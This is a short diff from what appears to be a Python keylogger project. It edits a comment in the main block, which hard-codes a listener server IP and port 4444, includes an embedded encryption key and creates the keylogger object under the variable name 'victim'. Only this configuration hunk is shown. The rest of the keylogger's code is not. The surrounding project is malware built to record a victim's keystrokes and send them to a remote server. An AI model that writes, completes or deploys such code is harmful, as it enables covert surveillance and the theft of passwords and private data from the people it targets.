@@ -91,7 +91,7 @@ class Keylogger():
 
 if __name__ == '__main__':
 	
-	Host = "192.168.1.39" # Server IP
+	Host = "192.168.1.39" # Server IP, changes depends on network
 	Port = 4444   # Server Port
 	KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8=" # keys for encrypting
 	victim = Keylogger(Host, Port, KEY)	
